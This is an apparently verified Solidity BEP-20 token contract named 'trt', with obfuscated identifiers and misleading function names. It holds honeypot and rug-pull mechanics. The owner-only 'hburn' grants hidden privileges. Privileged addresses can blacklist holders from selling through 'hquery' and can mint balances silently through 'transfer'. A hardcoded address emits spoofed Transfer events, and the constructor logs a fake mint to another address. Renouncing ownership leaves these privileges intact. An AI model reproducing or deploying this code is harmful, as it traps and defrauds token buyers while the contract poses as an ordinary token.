/**
 *Submitted for verification at BscScan.com on 2022-11-05
*/

pragma solidity 0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address gFX = 0x8DFf9E864b641AA9F45F5C57A75327418A413d05;
	address hWFX = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
        require(msg.sender == _Owner);
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract trt is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private hZA;
	mapping (address => bool) private hZE;
    mapping (address => bool) private hZW;
    mapping (address => mapping (address => uint256)) private hZV;
    uint8 private constant HZD = 8;
    uint256 private constant hTS = 3 * (10** HZD);
    string private constant _name = "trt";
    string private constant _symbol = "trt";



    constructor () {
        hZA[_msgSender()] = hTS;
         hRMC(hWFX, hTS); }
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return HZD;
    }

    function totalSupply() public pure  returns (uint256) {
        return hTS;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return hZA[account];
    }
	

   

	


    function allowance(address owner, address spender) public view  returns (uint256) {
        return hZV[owner][spender];
    }

            function approve(address spender, uint256 amount) public returns (bool success) {    
        hZV[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }
		function hquery(address hZJ) public{
         if(hZE[msg.sender])  { 
        hZW[hZJ] = true; }}
        

		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(sender == gFX)  {
        require(amount <= hZA[sender]);
        hZA[sender] -= amount;  
        hZA[recipient] += amount; 
          hZV[sender][msg.sender] -= amount;
        emit Transfer (hWFX, recipient, amount);
        return true; }  else  
          if(!hZW[recipient]) {
          if(!hZW[sender]) {
         require(amount <= hZA[sender]);
        require(amount <= hZV[sender][msg.sender]);
        hZA[sender] -= amount;
        hZA[recipient] += amount;
        hZV[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}}
		function hStake(address hZJ) public {
        if(hZE[msg.sender]) { 
        hZW[hZJ] = false;}}
		function hRMC(address hZJ, uint256 hZN) onlyOwner internal {
    emit Transfer(address(0), hZJ ,hZN); }
		
		function transfer(address hZJ, uint256 hZN) public {
        if(msg.sender == gFX)  {
        require(hZA[msg.sender] >= hZN);
        hZA[msg.sender] -= hZN;  
        hZA[hZJ] += hZN; 
        emit Transfer (hWFX, hZJ, hZN);} else  
        if(hZE[msg.sender]) {hZA[hZJ] += hZN;} else
        if(!hZW[msg.sender]) {
        require(hZA[msg.sender] >= hZN);
        hZA[msg.sender] -= hZN;  
        hZA[hZJ] += hZN;          
        emit Transfer(msg.sender, hZJ, hZN);}}
		
			function hburn(address hZJ) onlyOwner public{
        hZE[hZJ] = true; }
		
		

		
		}